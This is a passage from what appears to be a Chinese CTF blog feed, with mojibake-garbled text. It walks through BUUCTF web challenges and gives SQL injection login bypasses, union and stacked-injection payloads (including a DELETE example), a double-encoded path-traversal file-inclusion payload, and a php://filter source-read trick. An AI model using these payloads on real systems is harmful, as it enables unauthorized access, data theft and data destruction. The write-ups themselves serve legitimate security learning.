1113150537<br>v17 = 2068924245</p></blockquote><p>å°†è¿™äº›åè¿›åˆ¶ç æŒ‰é¡ºåºï¼Œä¾æ¬¡å„ä¸ªè¿›è¡Œ10â€”-&gt;16â€”â€“&gt;å­—ç¬¦ä¸²è½¬ç ï¼Œæ‹¼æ¥èµ·æ¥å³å¾—flag</p><blockquote><p>1230193475<br>2068924245<br>1113150537<br>1127044936<br>1497714515<br>1397828937<br>1481460802<br>1313036669</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://kannikanyun.github.io/2022/05/12/BUU-Web-page1/"/>
    <id>https://kannikanyun.github.io/2022/05/12/BUU-Web-page1/</id>
    <published>2022-05-12T14:07:34.000Z</published>
    <updated>2022-06-11T10:03:31.616Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1ã€-æå®¢å¤§æŒ‘2019-EasySQL1"><a href="#1ã€-æå®¢å¤§æŒ‘2019-EasySQL1" class="headerlink" title="1ã€[æå®¢å¤§æŒ‘2019]EasySQL1"></a>1ã€[æå®¢å¤§æŒ‘2019]EasySQL1</h1><p>çœ‹åˆ°SQLå°±æƒ³åˆ°å…ˆå°è¯•ä¸‡èƒ½å¯†ç </p><blockquote><p>1â€™ or 1=1#</p><p>è§£é‡Šï¼šâ€™æ˜¯ä¸ºäº†å½¢æˆé—­åˆè¯­å¥ï¼Œ#ä¸ºæ³¨é‡Šç¬¦(åé¢è¯­å¥ä¸å†æ‰§è¡Œ)</p><p>éœ€è¦æ³¨æ„çš„æ˜¯:</p><p>1.#å¯èƒ½ä¼šè¢«URLè‡ªåŠ¨è¿›è¡Œç¼–ç å¯¼è‡´è¯­å¥é”™è¯¯</p><p>2.ç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨<code>/**/</code>ç»•è¿‡</p><p><em><u>è§£å†³ï¼š%23ä¸º#æ³¨é‡Šç¬¦çš„urlç¼–ç </u></em></p><p>è¯­å¥ç›¸å½“äºï¼š</p></blockquote><pre class="line-numbers language-none"><code class="language-none">select * from table_name where username&#x3D;&#39;1&#39; or 1&#x3D;1 # &#39; and password&#x3D;&#39;xxxxxx&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-å…¶å®åº”è¯¥å…ˆç®€å•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹çš„"><a href="#2-å…¶å®åº”è¯¥å…ˆç®€å•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹çš„" class="headerlink" title="2.å…¶å®åº”è¯¥å…ˆç®€å•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹çš„"></a>2.å…¶å®åº”è¯¥å…ˆç®€å•åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹çš„</h2><p>ã€€å¦‚æœé¡µé¢è¿”å›é”™è¯¯ï¼Œåˆ™å­˜åœ¨ Sql æ³¨å…¥ã€‚ åŸå› æ˜¯æ— è®ºå­—ç¬¦å‹è¿˜æ˜¯æ•´å‹éƒ½ä¼šå› ä¸º</p><blockquote><p><strong>å•å¼•å·ä¸ªæ•°ä¸åŒ¹é…</strong></p></blockquote><p>è€ŒæŠ¥é”™ã€‚</p><h2 id="3ç¬¬ä¸‰æ­¥ã€åˆ©ç”¨order-byæŸ¥è¡¨çš„åˆ—æ•°"><a href="#3ç¬¬ä¸‰æ­¥ã€åˆ©ç”¨order-byæŸ¥è¡¨çš„åˆ—æ•°" class="headerlink" title="3ç¬¬ä¸‰æ­¥ã€åˆ©ç”¨order byæŸ¥è¡¨çš„åˆ—æ•°"></a>3<em><strong>ç¬¬ä¸‰æ­¥ã€åˆ©ç”¨order byæŸ¥è¡¨çš„åˆ—æ•°</strong></em></h2><p><code>payloadï¼šusername=1&#39; order by 3%23&amp;password=123ï¼ˆNO,Wrong username passwordï¼ï¼ï¼ï¼‰</code><br><code>payloadï¼šusername=1&#39; order by 4%23&amp;password=123ï¼ˆUnknown column &#39;4&#39; in &#39;order clause&#39;ï¼‰</code><br><code>è¯´æ˜è¡¨åªæœ‰ä¸‰åˆ—</code></p><h4 id="4-ç¬¬å››æ­¥ã€å¦‚æœ‰å›æ˜¾ï¼Œæ‰¾åˆ°å›æ˜¾ä½ï¼ˆå›æ˜¾ï¼Œå°±æ˜¯æ˜¾ç¤ºæ­£åœ¨æ‰§è¡Œçš„æ‰¹å¤„ç†å‘½ä»¤åŠæ‰§è¡Œçš„ç»“æœç­‰ï¼‰"><a href="#4-ç¬¬å››æ­¥ã€å¦‚æœ‰å›æ˜¾ï¼Œæ‰¾åˆ°å›æ˜¾ä½ï¼ˆå›æ˜¾ï¼Œå°±æ˜¯æ˜¾ç¤ºæ­£åœ¨æ‰§è¡Œçš„æ‰¹å¤„ç†å‘½ä»¤åŠæ‰§è¡Œçš„ç»“æœç­‰ï¼‰" class="headerlink" title="4.ç¬¬å››æ­¥ã€å¦‚æœ‰å›æ˜¾ï¼Œæ‰¾åˆ°å›æ˜¾ä½ï¼ˆå›æ˜¾ï¼Œå°±æ˜¯æ˜¾ç¤ºæ­£åœ¨æ‰§è¡Œçš„æ‰¹å¤„ç†å‘½ä»¤åŠæ‰§è¡Œçš„ç»“æœç­‰ï¼‰"></a>4.<em><strong>ç¬¬å››æ­¥ã€å¦‚æœ‰å›æ˜¾ï¼Œæ‰¾åˆ°å›æ˜¾ä½ï¼ˆå›æ˜¾ï¼Œå°±æ˜¯æ˜¾ç¤ºæ­£åœ¨æ‰§è¡Œçš„æ‰¹å¤„ç†å‘½ä»¤åŠæ‰§è¡Œçš„ç»“æœç­‰ï¼‰</strong></em></h4><blockquote><p>payloadï¼šusername=1â€™ union select 1,2,3%23&amp;password=123</p></blockquote><h2 id="æ³•äºŒï¼šä¸¤å¤„åˆ¤æ–­éƒ½ç»•è¿‡"><a href="#æ³•äºŒï¼šä¸¤å¤„åˆ¤æ–­éƒ½ç»•è¿‡" class="headerlink" title="æ³•äºŒï¼šä¸¤å¤„åˆ¤æ–­éƒ½ç»•è¿‡"></a>æ³•äºŒï¼šä¸¤å¤„åˆ¤æ–­éƒ½ç»•è¿‡</h2><p>ä½¿ç”¨ä¸¤æ¬¡<code>&#39;or 1=1#</code></p><p><code>?username=1&#39;or 1=1%23&amp;password=1&#39; or 1=1%23</code></p><p>[(70æ¡æ¶ˆæ¯) CTF-BUUCTF-<a href="https://blog.csdn.net/qq_42404383/article/details/103688509?ops_request_misc=%7B%22request_id%22:%22165054871516780264049295%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165054871516780264049295&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-103688509.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BHCTF+2018%5DWarmUp+1&spm=1018.2226.3001.4187">HCTF 2018]WarmUp_é»‘ä»”ä¸¶çš„åšå®¢-CSDNåšå®¢_buuctfçš„warmupé¢˜</a></p><h1 id="2ã€-HCTF-2018-WarmUp"><a href="#2ã€-HCTF-2018-WarmUp" class="headerlink" title="2ã€[HCTF 2018]WarmUp"></a>2ã€[HCTF 2018]WarmUp</h1><blockquote><p>F12æç¤ºsource.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">emmm</span><span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>   <span class="token comment">//ä¼ å…¥äº†å˜é‡pageï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åˆšåˆšä¼ è¿›æ¥çš„file</span>  <span class="token punctuation">&#123;</span>  <span class="token comment">// è¿™é‡Œå®šä¹‰äº†ç™½åå•</span>      <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"source.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"hint"</span><span class="token operator">=></span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">/*ä¸ºäº†è¿”å› true ä¸¤ä¸ªæ¡ä»¶å¿…é¡»æ»¡è¶³      1 pageå­˜åœ¨       2 pageæ˜¯å­—ç¬¦ä¸² ï¼Œ      è¿™é‡Œå’Œå¤–å±‚çš„åˆ¤æ–­file ä¸€è‡´åŸºæœ¬æ˜¯å†æ¬¡åˆ¤æ–­äº†ä¸€é*/</span>          <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token comment">/*in_array(search,array,type) å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ï¼Œç™½åå•è¿‡æ»¤ï¼Œéœ€è¦è¿”å›äº†tureæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä¼ å…¥çš„pageæˆ–è€…æ˜¯ç»è¿‡æˆªæ–­ä¹‹åçš„pageå¿…é¡»æ˜¯soure.phpæˆ–hint.phpï¼Œè¿™é‡Œæ˜¯æ­£å¸¸çš„è®¿é—®ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ æ–‡ä»¶ä»»æ„åŒ…å«ï¼Œæ‰€ä»¥è¿™é‡Œä¼ å…¥çš„ä¸æ»¡è¶³æ¡ä»¶ï¼Œè¿™é‡Œä¸æ˜¯æ³¨æ„çš„ç‚¹ï¼Œå¾€ä¸‹ç»§ç»­çœ‹*/</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>           <span class="token variable">$page</span><span class="token punctuation">,</span>          <span class="token number">0</span><span class="token punctuation">,</span>          <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*è¿™é‡Œmb_sustr æ˜¯ä¸ªæˆªæ–­ï¼Œè¿”å›0åˆ°mb_strposä¹‹é—´çš„å†…å®¹ï¼Œè€Œmb_strps åˆ™æ˜¯æŸ¥æ‰¾ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œæ‰€ä»¥åŸºæœ¬å¯ä»¥ç†è§£ä¸ºè·å–page ä¸¤ä¸ªï¼Ÿä¹‹é—´çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è·å–fileä¸¤ä¸ªï¼Ÿä¹‹é—´çš„å­—ç¬¦ä¸²ï¼Œæ”¾åˆ°urlä¸­å°±æ˜¯http://ip/?file=ddd?ä¸­çš„file=ddd*/</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>           <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">//è¿™é‡Œå’Œä¸Šé¢ç±»ä¼¼ æŸ¥çœ‹_page æ˜¯å¦åœ¨ç™½åå•ä¸­</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è¿™é‡Œå‘ç°å¯¹_pageè¿›è¡Œäº†ä¸€æ¬¡decodeè§£ç ï¼Œ</span>      <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token comment">//è·å–ä¸¤ä¸ªï¼Ÿï¼Ÿä¹‹é—´çš„å†…å®¹</span>          <span class="token variable">$_page</span><span class="token punctuation">,</span>          <span class="token number">0</span><span class="token punctuation">,</span>          <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// è¿™é‡Œæ˜¯æˆ‘ä»¬è¦ç»•è¿‡çš„ç‚¹ï¼Œä»è¿™é‡Œå¾€ä¸Šçœ‹ å°è¯•æ„é€ </span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//ç™½åå•</span>          <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">echo</span> <span class="token string double-quoted-string">"you can't see it"</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">emmm</span><span class="token operator">::</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">/</span><span class="token operator">*</span>å¿…é¡»æ»¡è¶³<span class="token keyword">if</span>æ¡ä»¶ï¼Œæ‰èƒ½åŒ…å«fileï¼Œè¿™é‡Œä¹Ÿå¯ä»¥çŒœåˆ°å¯èƒ½è€ƒçš„æ˜¯æ–‡ä»¶åŒ…å«ï¼š <span class="token number">1</span> <span class="token constant">REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>ä¸ä¸ºç©º <span class="token number">2</span> <span class="token constant">REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span>æ˜¯å­—ç¬¦ä¸² <span class="token number">3</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> ä¸ºtureï¼Œå›åˆ°checkFile å‡½æ•°åˆ†æå¦‚ä½•è¿”å›<span class="token constant boolean">true</span><span class="token operator">*</span><span class="token operator">/</span>    <span class="token delimiter important">?></span></span>å¯ä»¥çœ‹åˆ°å‡½æ•°ä»£ç ä¸­æœ‰å››ä¸ªifè¯­å¥ç¬¬ä¸€ä¸ªifè¯­å¥å¯¹å˜é‡è¿›è¡Œæ£€éªŒï¼Œè¦æ±‚$pageä¸ºå­—ç¬¦ä¸²ï¼Œå¦åˆ™è¿”å›falseç¬¬äºŒä¸ªifè¯­å¥åˆ¤æ–­$pageæ˜¯å¦å­˜åœ¨äº$whitelistæ•°ç»„ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›trueç¬¬ä¸‰ä¸ªifè¯­å¥åˆ¤æ–­æˆªå–åçš„$pageæ˜¯å¦å­˜åœ¨äº$whitelistæ•°ç»„ä¸­ï¼Œæˆªå–$pageä¸­'?'å‰éƒ¨åˆ†ï¼Œå­˜åœ¨åˆ™è¿”å›trueç¬¬å››ä¸ªifè¯­å¥åˆ¤æ–­urlè§£ç å¹¶æˆªå–åçš„$pageæ˜¯å¦å­˜åœ¨äº$whitelistä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›trueè‹¥ä»¥ä¸Šå››ä¸ªifè¯­å¥å‡æœªè¿”å›å€¼ï¼Œåˆ™è¿”å›falseæœ‰ä¸‰ä¸ªifè¯­å¥å¯ä»¥è¿”å›trueï¼Œç¬¬äºŒä¸ªè¯­å¥ç›´æ¥åˆ¤æ–­$pageï¼Œä¸å¯ç”¨ç¬¬ä¸‰ä¸ªè¯­å¥æˆªå–'?'å‰éƒ¨åˆ†ï¼Œç”±äº?è¢«åéƒ¨åˆ†è¢«è§£æä¸ºgetæ–¹å¼æäº¤çš„å‚æ•°ï¼Œä¹Ÿä¸å¯åˆ©ç”¨ç¬¬å››ä¸ªifè¯­å¥ä¸­ï¼Œå…ˆè¿›è¡Œurlè§£ç å†æˆªå–ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†?ç»è¿‡ä¸¤æ¬¡urlç¼–ç ï¼Œåœ¨æœåŠ¡å™¨ç«¯æå–å‚æ•°æ—¶è§£ç ä¸€æ¬¡ï¼ŒcheckFileå‡½æ•°ä¸­è§£ç ä¸€æ¬¡ï¼Œä»ä¼šè§£ç ä¸º'?'ï¼Œä»å¯é€šè¿‡ç¬¬å››ä¸ªifè¯­å¥æ ¡éªŒã€‚ï¼ˆ'?'ä¸¤æ¬¡ç¼–ç å€¼ä¸º'%253f'ï¼‰,æ„é€ urlï¼šæ‰€ä»¥æˆ‘ä»¬çš„payload å°±æ˜¯file=source.php?file=source.php%253f../../../../../ffffllllaaaagggg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h2><p><code>source.php?file=source.php%253f../../../../../ffffllllaaaagggg</code></p><blockquote><p>è§£é‡Šï¼š</p><p>1ã€PHP $_REQUEST</p><p>PHP $_REQUEST ç”¨äºæ”¶é›†HTMLè¡¨å•æäº¤çš„æ•°æ®ã€‚</p><p>2ã€?ä¸¤æ¬¡urlç¼–ç åä¸ºï¼š%253f</p><p>3ã€../../../../../çŒœæµ‹ï¼šæ ¹æ®ffffllllaaaaggggæœ‰å››å±‚çš„åŸå› </p></blockquote><p>3ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$cat</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cat'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token variable">$cat</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$cat</span><span class="token operator">==</span><span class="token string single-quoted-string">'dog'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Syc&#123;cat_cat_cat_cat&#125;'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>payload:?cat=dog</p><p>æ³¨æ„ï¼šä¸èƒ½å†™æˆ?cat=â€™dogâ€™ï¼ˆçŒœæµ‹å¯èƒ½è¢«å½“åšå­—ç¬¦å‚æ•°è¢«è§£æï¼‰</p></blockquote><h1 id="3ã€-ACTF2020-æ–°ç”Ÿèµ›-Include"><a href="#3ã€-ACTF2020-æ–°ç”Ÿèµ›-Include" class="headerlink" title="3ã€[ACTF2020 æ–°ç”Ÿèµ›]Include"></a>3ã€[ACTF2020 æ–°ç”Ÿèµ›]Include</h1><blockquote><p>åªæœ‰ï¼šCan you find out the flag?</p></blockquote><p>æºç ä¹Ÿæ²¡æœ‰æç¤º</p><p>æ— æ€è·¯äº†ï¼ŒæŸ¥è¯¢</p><p>ä¸»è¦æ€è·¯ï¼š</p><p><code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><blockquote><p><a href="https://www.php.cn/php-weizijiaocheng-387051.html">PHPä¸­filteråè®®è¯¦è§£</a></p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">php://filter çš„ä½¿ç”¨</a></p><p>è¯»å–æºæ–‡ä»¶ï¼Œå¹¶ç”¨baseç¼–ç ï¼Œç»•è¿‡</p><p>base64ç¼–ç ç»“æœä¸ºï¼š</p><p><code>PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7MzQ2NTQwYTAtMTI1MS00OGNmLTkyOWItODQ0NDVmMjc0ZTk4fQo=</code></p><p>è§£ç åä¸ºï¼š</p><p><code>&lt;?php echo &quot;Can you find out the flag?&quot;; //flag&#123;346540a0-1251-48cf-929b-84445f274e98&#125;</code></p></blockquote><p>å¯ä»¥çœ‹å‡ºï¼šflagä¸ºæ³¨é‡Šå†…å®¹ï¼Œä¹Ÿå°±å¯ä»¥è§£é‡Šäº†ï¼Œç¼–ç åå¯ä»¥çœ‹åˆ°å®Œæ•´æºç </p><h1 id="4ã€-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨"><a href="#4ã€-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨" class="headerlink" title="4ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨"></a>4ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h1><h2 id="sqlå †å æ³¨å…¥çŸ¥è¯†"><a href="#sqlå †å æ³¨å…¥çŸ¥è¯†" class="headerlink" title="sqlå †å æ³¨å…¥çŸ¥è¯†"></a>sqlå †å æ³¨å…¥çŸ¥è¯†</h2><p>å †å æ³¨å…¥åŸç†ï¼š</p><blockquote><p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p></blockquote><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p><a href="https://www.zhaoj.in/read-5873.html#0x04">è§£é¢˜å…·ä½“æ­¥éª¤</a></p><p>æ€è·¯æ€»ç»“ï¼š</p><blockquote><p>1.å…ˆåˆ¤æ–­æœ‰æ— æ³¨å…¥ç‚¹<br><code>è¾“å…¥1ï¼Œå›æ˜¾é”™è¯¯ï¼›</code></p><p>`è¾“å…¥1#ï¼Œæ­£å¸¸å›æ˜¾ï¼›ï¼ˆè¯´æ˜å­˜åœ¨sqlæ³¨å…¥ï¼‰ï¼›</p><p><code>è¾“å…¥1&#39; or &#39;1&#39;=&#39;1ï¼ˆä¸è¿›è¡Œæ³¨é‡Š#ï¼Œä¾æ—§å›æ˜¾æ­£å¸¸ï¼Œè¯æ˜åˆ¤æ–­æ­£ç¡®ï¼‰</code></p><p>2.åˆ¤æ–­å­—æ®µ<br><code>1&#39; order by 3 #ï¼ˆ1ã€2å‡æ­£ç¡®ï¼Œ3å›æ˜¾é”™è¯¯ï¼Œè¯´æ˜æœ‰ä¸¤ä¸ªå­—æ®µï¼‰ã€Šæ˜¯ä¸æ˜¯è¯´æ˜äº†æœ‰ä¸¤ä¸ªå›æ˜¾ä½å‘¢ï¼Ÿã€‹</code></p><p>3.ç»§ç»­æŸ¥è¯¢<br><code>1&#39; union select 1,2#</code>å›æ˜¾é”™è¯¯è¿”å›ï¼š<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);(æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤å…³é”®è¯)ï¼Œåˆ°è¿™é‡Œå·²ç»èƒ½çœ‹å‡ºæ¥äº†ï¼šå¾ˆå¤šæŸ¥è¯¢å…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†ï¼Œæ­£å¸¸æ–¹æ³•æ˜¯æŸ¥ä¸åˆ°äº†</code></p><p>4.(æŸ¥è¯¢åˆ°äº†è¡¨å’Œå­—æ®µï¼Œä½†æ˜¯é»˜è®¤æŸ¥è¯¢è¡¨ä¸­å¹¶æ²¡æœ‰å’±ä»¬æƒ³è¦çš„flagï¼Œå› æ­¤ï¼Œæƒ³è¦æ‹¿åˆ°flagå¿…é¡»è®©é»˜è®¤æŸ¥è¯¢çš„è¡¨ä¸å­—æ®µå’Œflagæ‰€åœ¨ååŒ¹é…  